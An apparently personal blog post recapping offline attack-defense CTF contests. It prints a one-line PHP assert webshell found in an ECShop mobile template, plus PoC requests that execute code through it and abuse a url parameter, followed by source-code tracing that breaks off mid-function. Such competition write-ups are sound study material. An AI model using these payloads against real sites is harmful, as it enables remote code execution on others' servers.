<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="好久没发博客了&mldr;主要是比赛太多了&mldr;这几个月周末几乎无休，基本都是各种比赛\n先慢慢来总结吧。\n“西湖论剑”杯线下AWD 前一个小时和平发育，基本没人打&mldr;也不知道为啥&mldr;\n"><title>记几次攻防赛</title>
<link rel=canonical href=https://zeddyu.github.io/p/%E8%AE%B0%E5%87%A0%E6%AC%A1%E6%94%BB%E9%98%B2%E8%B5%9B/><link rel=stylesheet href=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///scss/style.min.css integrity="sha256-fF7AdIPMSCGGaIS7UZHBfGQpV0YU38aZCzY1ucpb+iU=" crossorigin=anonymous><meta property='og:title' content="记几次攻防赛"><meta property='og:description' content="好久没发博客了&mldr;主要是比赛太多了&mldr;这几个月周末几乎无休，基本都是各种比赛\n先慢慢来总结吧。\n“西湖论剑”杯线下AWD 前一个小时和平发育，基本没人打&mldr;也不知道为啥&mldr;\n"><meta property='og:url' content='https://zeddyu.github.io/p/%E8%AE%B0%E5%87%A0%E6%AC%A1%E6%94%BB%E9%98%B2%E8%B5%9B/'><meta property='og:site_name' content="Zeddy's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='AWD'><meta property='article:published_time' content='2018-06-27T19:28:00+00:00'><meta property='article:modified_time' content='2018-06-27T19:28:00+00:00'><meta name=twitter:title content="记几次攻防赛"><meta name=twitter:description content="好久没发博客了&mldr;主要是比赛太多了&mldr;这几个月周末几乎无休，基本都是各种比赛\n先慢慢来总结吧。\n“西湖论剑”杯线下AWD 前一个小时和平发育，基本没人打&mldr;也不知道为啥&mldr;\n"><link rel="shortcut icon" href=/favicon.ico><style>body:has(.article-content){.article-readmore { display: none; }}</style><script>enScroll=!1,enFdl=!1,extCurrent=void 0,filename=void 0,targetText=void 0,splitOrigin=void 0;const lStor=localStorage,sStor=sessionStorage,doc=document,docEl=document.documentElement,docBody=document.body,docLoc=document.location,w=window,s=screen,nav=navigator||{},extensions=["pdf","xls","xlsx","doc","docx","txt","rtf","csv","exe","key","pps","ppt","pptx","7z","pkg","rar","gz","zip","avi","mov","mp4","mpe","mpeg","wmv","mid","midi","mp3","wav","wma"];function a(e,t,n,o){const j="G-PDESKL57LT",r=()=>Math.floor(Math.random()*1e9)+1,c=()=>Math.floor(Date.now()/1e3),F=()=>(sStor._p||(sStor._p=r()),sStor._p),E=()=>r()+"."+c(),_=()=>(lStor.cid_v4||(lStor.cid_v4=E()),lStor.cid_v4),m=lStor.getItem("cid_v4"),v=()=>m?void 0:enScroll==!0?void 0:"1",p=()=>(sStor.sid||(sStor.sid=c()),sStor.sid),O=()=>{if(!sStor._ss)return sStor._ss="1",sStor._ss;if(sStor.getItem("_ss")=="1")return void 0},a="1",g=()=>{if(sStor.sct)if(enScroll==!0)return sStor.sct;else x=+sStor.getItem("sct")+ +a,sStor.sct=x;else sStor.sct=a;return sStor.sct},i=docLoc.search,b=new URLSearchParams(i),h=["q","s","search","query","keyword"],y=h.some(e=>i.includes("&"+e+"=")||i.includes("?"+e+"=")),u=()=>y==!0?"view_search_results":enScroll==!0?"scroll":enFdl==!0?"file_download":"page_view",f=()=>enScroll==!0?"90":void 0,C=()=>{if(u()=="view_search_results"){for(let e of b)if(h.includes(e[0]))return e[1]}else return void 0},d=encodeURIComponent,k=e=>{let t=[];for(let n in e)e.hasOwnProperty(n)&&e[n]!==void 0&&t.push(d(n)+"="+d(e[n]));return t.join("&")},A=!1,S="https://ga.zdy.one/collect_path",M=k({v:"2",tid:j,_p:F(),sr:(s.width*w.devicePixelRatio+"x"+s.height*w.devicePixelRatio).toString(),ul:(nav.language||void 0).toLowerCase(),cid:_(),_fv:v(),_s:"1",dl:docLoc.origin+docLoc.pathname+i,dt:doc.title||void 0,dr:doc.referrer||void 0,sid:p(),sct:g(),seg:"1",en:u(),"epn.percent_scrolled":f(),"ep.search_term":C(),"ep.file_extension":e||void 0,"ep.file_name":t||void 0,"ep.link_text":n||void 0,"ep.link_url":o||void 0,_ss:O(),_dbg:A?1:void 0}),l=S+"?"+M;if(nav.sendBeacon)nav.sendBeacon(l);else{let e=new XMLHttpRequest;e.open("POST",l,!0)}}a();function sPr(){return(docEl.scrollTop||docBody.scrollTop)/((docEl.scrollHeight||docBody.scrollHeight)-docEl.clientHeight)*100}doc.addEventListener("scroll",sEv,{passive:!0});function sEv(){const e=sPr();if(e<90)return;enScroll=!0,a(),doc.removeEventListener("scroll",sEv,{passive:!0}),enScroll=!1}document.addEventListener("DOMContentLoaded",function(){let e=document.getElementsByTagName("a");for(let t=0;t<e.length;t++)if(e[t].getAttribute("href")!=null){const n=e[t].getAttribute("href"),s=n.substring(n.lastIndexOf("/")+1),o=s.split(".").pop();(e[t].hasAttribute("download")||extensions.includes(o))&&e[t].addEventListener("click",fDl,{passive:!0})}});function fDl(e){enFdl=!0;const t=e.currentTarget.getAttribute("href"),n=t.substring(t.lastIndexOf("/")+1),s=n.split(".").pop(),o=n.replace("."+s,""),i=e.currentTarget.text,r=t.replace(docLoc.origin,"");a(s,o,i,r),enFdl=!1}</script></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky compact"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io//img/avatar_hu6396534569623136415.webp width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>Zeddy's Blog</a></h1><h2 class=site-description></h2></div></header><ol class=menu-social><li><a href=https://github.com/ZeddYu target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://zeddyu.github.io/atom.xml target=_blank title=Rss rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://x.com/ZeddYu_Lu target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/ads/><svg class="icon icon-tabler icon-tabler-ad" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M7 15v-4a2 2 0 014 0v4"/><line x1="7" y1="13" x2="11" y2="13"/><path d="M17 9v6h-1.5a1.5 1.5.0 111.5-1.5"/></svg>
<span>Advertisement</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#西湖论剑杯线下awd>“西湖论剑”杯线下AWD</a><ol><li><a href=#poc-1>Poc 1</a></li><li><a href=#poc-1-分析>Poc 1 分析</a></li><li><a href=#poc-2>Poc 2</a></li><li><a href=#poc-2-分析>Poc 2 分析</a></li><li><a href=#poc-3>Poc 3</a></li><li><a href=#something-else>Something Else</a></li></ol></li><li><a href=#第二届红帽杯线下攻防大赛>第二届“红帽杯”线下攻防大赛</a><ol><li><a href=#web1>Web1</a><ol><li><a href=#poc-1-1>Poc 1</a></li><li><a href=#poc-2-1>Poc 2</a></li><li><a href=#poc-3-1>Poc 3</a></li><li><a href=#poc-4>Poc 4</a></li><li><a href=#eles>Eles</a></li></ol></li><li><a href=#web2>Web2</a><ol><li><a href=#poc-1-2>Poc 1</a></li><li><a href=#poc-2-2>Poc 2</a></li><li><a href=#poc-3-2>Poc 3</a></li><li><a href=#poc-4-1>Poc 4</a></li><li><a href=#poc-5>Poc 5</a></li></ol></li></ol></li><li><a href=#总结>总结</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/ctf/ style=background-color:#ce0000;color:#fff>CTF</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/%E8%AE%B0%E5%87%A0%E6%AC%A1%E6%94%BB%E9%98%B2%E8%B5%9B/>记几次攻防赛</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Jun 27, 2018</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>13 minute read</time></div><div class=article-readmore><a href=/p/%E8%AE%B0%E5%87%A0%E6%AC%A1%E6%94%BB%E9%98%B2%E8%B5%9B/>Read More…</a></div></footer></div></header><section class=article-content><p>好久没发博客了&mldr;主要是比赛太多了&mldr;这几个月周末几乎无休，基本都是各种比赛</p><p>先慢慢来总结吧。</p><h2 id=西湖论剑杯线下awd>“西湖论剑”杯线下AWD</h2><p>前一个小时和平发育，基本没人打&mldr;也不知道为啥&mldr;</p><p>这次也是我第二次参加AWD，第一次是在大一暑假参加的XMan结营赛的攻防&mldr;那时候啥都不懂，基本就是靠队内大佬带飞，直接飞到了团队第六，也就帮帮大佬传传shell啥的，不过也对攻防赛有了一个大致的印象。</p><p>这次AWD参选审核还是比较水的&mldr;当时好多都不知道怎么打的都来参加了&mldr;我还以为是大佬云集，我会被打的电脑都开不了的那种2333&mldr;感觉大家都还差不多&mldr;身后那支队后来直接放弃了，聊起天来了&mldr;</p><p>赛后想想，一开始没人打真的挺奇怪的，因为给的洞非常明显</p><p>这里放一个一叶飘零大佬的<a class=link href=http://skysec.top/2018/04/27/%E7%BA%BF%E4%B8%8BAD-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-ECShop-V2-7-3/ target=_blank rel=noopener>赛时分析文章</a>吧，我觉得写得非常好的，还是多应该向大佬学习学习</p><h3 id=poc-1>Poc 1</h3><p>首先在<code>mobile\themes\default\auction_list.dwt</code>中有一个很明显的一句话马</p><p><code>{:assert($_POST[1])}</code></p><p>这里要是谁发现的早，应该很快就可以打了&mldr;只是没人打&mldr;但是这也是赛中官方给了hint我们才发现的&mldr;</p><p>赛后用D盾扫了一遍啥洞都没发现&mldr;</p><p>后来的poc都是抄作业抄过来的&mldr;当时也是被打得挺惨的&mldr;还是抓log后来才知道怎么打&mldr;还是经验太少了</p><p>基本抄的还是这个点</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>post方式</span>
</span></span><span class=line><span class=cl><span class=nx>文件url：http</span><span class=o>://</span><span class=mf>10.50</span><span class=o>.</span><span class=mf>33.2</span><span class=o>/</span><span class=nx>mobile</span><span class=o>/</span><span class=nx>index</span><span class=o>.</span><span class=nx>php</span><span class=o>?</span><span class=nx>m</span><span class=o>=</span><span class=k>default</span><span class=o>&amp;</span><span class=nx>c</span><span class=o>=</span><span class=nx>auction</span>
</span></span><span class=line><span class=cl><span class=nx>参数：1</span><span class=o>=</span><span class=nx>phpinfo</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=poc-1-分析>Poc 1 分析</h3><p>首先，先看<code>assert()</code>，参照<a class=link href=http://php.net/manual/zh/function.assert.php target=_blank rel=noopener>php文档</a>。</p><blockquote><p>PHP 5</p><p>bool assert ( mixed $assertion [, string $description ] )</p><hr><p>PHP 7</p><p>bool assert ( mixed $assertion [, Throwable $exception ] )</p><p>如果 <code>assertion</code> 是字符串，它将会被 assert() 当做 PHP 代码来执行</p></blockquote><p>很经典的一个一句话马</p><p>再看为什么在<code>dwt</code>文件里面就可以</p><blockquote><p>dwt 文件是网页模板文件(Dreamweaver Template), 在创建网站的多个网页的时候，通常可以将网页的共同部分创建成为一个模板， 然后给多个网页调用， 以实现网页代码的重复利用· 制作模板的时候， 用户可以自定义的模板可编辑区域和非可编辑区域， 可编辑区域将在调用模板的网页中再次填充代码</p></blockquote><p>既然是个网页模版，而整个站都用的是<code>php</code>，模版里的字符串自然会被当作<code>php</code>来解析。所以这里一句话马可以被执行</p><h3 id=poc-2>Poc 2</h3><p>参照一叶飘零大佬的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>post方式</span>
</span></span><span class=line><span class=cl><span class=nx>文件url：http</span><span class=o>://</span><span class=mf>10.50</span><span class=o>.%</span><span class=nx>s</span><span class=o>.</span><span class=mi>2</span><span class=o>/</span><span class=nx>mobile</span><span class=o>/</span><span class=nx>index</span><span class=o>.</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>参数：url</span><span class=o>=</span><span class=nx>http</span><span class=o>://</span><span class=mf>10.0</span><span class=o>.</span><span class=mf>1.2</span><span class=o>?</span><span class=nx>token</span><span class=o>=</span><span class=nx>队伍token</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=poc-2-分析>Poc 2 分析</h3><p>我们从<code>mobile/index.php</code>开始分析：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* 访问控制 */</span>
</span></span><span class=line><span class=cl>    <span class=nx>define</span><span class=p>(</span><span class=s1>&#39;IN_ECTOUCH&#39;</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* 设置系统编码格式 */</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Content-Type:text/html;charset=utf-8&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* 设置系统编码格式 */</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Pragma: no-cache&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* 修复后退没有提交数据的问题 */</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Cache-control: private&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* 加载核心文件 */</span> 
</span></span><span class=line><span class=cl>    <span class=k>require</span> <span class=p>(</span><span class=s1>&#39;include/EcTouch.php&#39;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>跟踪<code>require(...)</code>函数，看到<code>EcTouch.php</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* 访问控制 */</span>
</span></span><span class=line><span class=cl>    <span class=nx>defined</span><span class=p>(</span><span class=s1>&#39;IN_ECTOUCH&#39;</span><span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;Deny Access&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>version_compare</span><span class=p>(</span><span class=k>PHP_VERSION</span><span class=p>,</span> <span class=s1>&#39;5.2.0&#39;</span><span class=p>,</span> <span class=s1>&#39;&lt;&#39;</span><span class=p>))</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;require PHP &gt; 5.2.0 !&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>defined</span><span class=p>(</span><span class=s1>&#39;BASE_PATH&#39;</span><span class=p>)</span> <span class=k>or</span> <span class=nx>define</span><span class=p>(</span><span class=s1>&#39;BASE_PATH&#39;</span><span class=p>,</span> <span class=nx>dirname</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>)</span> <span class=o>.</span> <span class=s1>&#39;/&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>defined</span><span class=p>(</span><span class=s1>&#39;ROOT_PATH&#39;</span><span class=p>)</span> <span class=k>or</span> <span class=nx>define</span><span class=p>(</span><span class=s1>&#39;ROOT_PATH&#39;</span><span class=p>,</span> <span class=nx>realpath</span><span class=p>(</span><span class=nx>dirname</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>)</span> <span class=o>.</span> <span class=s1>&#39;/../&#39;</span><span class=p>)</span> <span class=o>.</span> <span class=s1>&#39;/&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>defined</span><span class=p>(</span><span class=s1>&#39;APP_PATH&#39;</span><span class=p>)</span> <span class=k>or</span> <span class=nx>define</span><span class=p>(</span><span class=s1>&#39;APP_PATH&#39;</span><span class=p>,</span> <span class=nx>BASE_PATH</span> <span class=o>.</span> <span class=s1>&#39;apps/&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>defined</span><span class=p>(</span><span class=s1>&#39;ADDONS_PATH&#39;</span><span class=p>)</span> <span class=k>or</span> <span class=nx>define</span><span class=p>(</span><span class=s1>&#39;ADDONS_PATH&#39;</span><span class=p>,</span> <span class=nx>ROOT_PATH</span> <span class=o>.</span> <span class=s1>&#39;plugins/&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>defined</span><span class=p>(</span><span class=s1>&#39;DEFAULT_APP&#39;</span><span class=p>)</span> <span class=k>or</span> <span class=nx>define</span><span class=p>(</span><span class=s1>&#39;DEFAULT_APP&#39;</span><span class=p>,</span> <span class=s1>&#39;default&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>defined</span><span class=p>(</span><span class=s1>&#39;DEFAULT_CONTROLLER&#39;</span><span class=p>)</span> <span class=k>or</span> <span class=nx>define</span><span class=p>(</span><span class=s1>&#39;DEFAULT_CONTROLLER&#39;</span><span class=p>,</span> <span class=s1>&#39;Index&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>defined</span><span class=p>(</span><span class=s1>&#39;DEFAULT_ACTION&#39;</span><span class=p>)</span> <span class=k>or</span> <span class=nx>define</span><span class=p>(</span><span class=s1>&#39;DEFAULT_ACTION&#39;</span><span class=p>,</span> <span class=s1>&#39;index&#39;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>再来看<code>APP_PATH</code>这个路径<code>apps/</code>，下面会有三个文件夹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>admin
</span></span><span class=line><span class=cl>default
</span></span><span class=line><span class=cl>install
</span></span></code></pre></td></tr></table></div></div><p>首先查看默认文件夹<code>default</code>，看到又有5个文件夹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>common
</span></span><span class=line><span class=cl>conf
</span></span><span class=line><span class=cl>controller
</span></span><span class=line><span class=cl>language
</span></span><span class=line><span class=cl>model
</span></span></code></pre></td></tr></table></div></div><p>再按照顺序首先来看第一个<code>common</code>，发现两个php文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>function.php
</span></span><span class=line><span class=cl>insert.php
</span></span></code></pre></td></tr></table></div></div><p>在<code>function.php</code>中有个上传的函数比较可疑</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>upload_file</span><span class=p>(</span><span class=nv>$upload</span><span class=p>,</span> <span class=nv>$type</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$upload</span><span class=p>[</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$ftype</span> <span class=o>=</span> <span class=nx>check_file_type</span><span class=p>(</span><span class=nv>$upload</span><span class=p>[</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>],</span> <span class=nv>$upload</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>],</span> <span class=s1>&#39;|png|jpg|jpeg|gif|doc|xls|txt|zip|ppt|pdf|rar|docx|xlsx|pptx|&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$ftype</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$name</span> <span class=o>=</span> <span class=nx>date</span><span class=p>(</span><span class=s1>&#39;Ymd&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=mi>6</span><span class=p>;</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>$name</span> <span class=o>.=</span> <span class=nx>chr</span><span class=p>(</span><span class=nx>mt_rand</span><span class=p>(</span><span class=mi>97</span><span class=p>,</span> <span class=mi>122</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
